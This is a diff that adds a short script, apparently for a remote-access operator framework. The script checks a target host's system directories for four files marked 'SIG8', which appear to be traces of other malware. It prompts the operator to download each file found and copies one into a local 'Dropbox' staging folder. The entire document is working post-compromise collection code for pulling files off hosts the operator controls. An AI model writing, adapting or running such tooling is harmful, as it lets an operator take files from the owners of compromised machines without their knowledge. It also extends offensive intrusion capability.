@@ -1,0 +1,71 @@
+@include "_FileExists.epm";
+@include "DropboxAPI.epm";
+string $syspath = GetEnv("SYSPATH");
+string $f1 = "$syspath\\s7otbxdx.dll";
+string $f2 = "$syspath\\s7otbxsx.dll";
+string $f3 = "$syspath\\drivers\\mrxcls.sys";
+string $f4 = "$syspath\\..\\inf\\mdmcpq3.pnf";
+bool $f1exist = _FileExists($f1, "");
+bool $f2exist = _FileExists($f2, "");
+bool $f3exist = _FileExists($f3, "");
+bool $f4exist = _FileExists($f4, "");
+
+if ($f1exist) {
+	@record on;
+	`dir $f1`;
+	@record off;
+	int $size_f1 = GetCmdData("size");
+	f1($f1,$size_f1); 
+}
+
+if ($f2exist) {
+	@record on;
+	`dir $f2`;
+	@record off;
+	int $size_f2 = GetCmdData("size");
+	f2($f2,$size_f2); 
+}
+
+if ($f3exist) {
+	@record on;
+	`dir $f3`;
+	@record off;
+	int $size_f3 = GetCmdData("size");
+	f3($f3,$size_f3); 
+}
+if ($f4exist) {
+	f4($f4); 
+}
+
+@record off;
+
+sub f1(IN string $f1, IN int $size_f1) {
+	
+	if (prompt "SIG8 was detected. Do you want to grab the files? \n $f1, size: $size_f1 \n") {
+		`get $f1`;
+	}
+}
+
+sub f2(IN string $f2, IN int $size_f2) {
+	if (prompt "SIG8 was detected. Do you want to grab the files? \n $f2, size: $size_f2 \n") {
+		`get $f2`;
+	}
+}
+
+sub f3(IN string $f3, IN int $size_f3) {
+	if (prompt "SIG8 was detected. Do you want to grab the files? \n $f3, size: $size_f3 \n") {
+		`get $f3`;
+	}
+}
+
+sub f4(IN string $f4) {
+	string $logdir = GetEnv("_LPDIR_LOGS");
+	`copyget $f4`;
+	@record on;
+	`local dir mdmcpq3* -path $logdir\\Get_Files`;
+	@record off;
+	string $downname = GetCmdData("name");
+	string $srcfile = "$logdir\\Get_Files\\$downname";
+	MoveLocalFileToDropbox("Sig08",$srcfile);
+}
+	
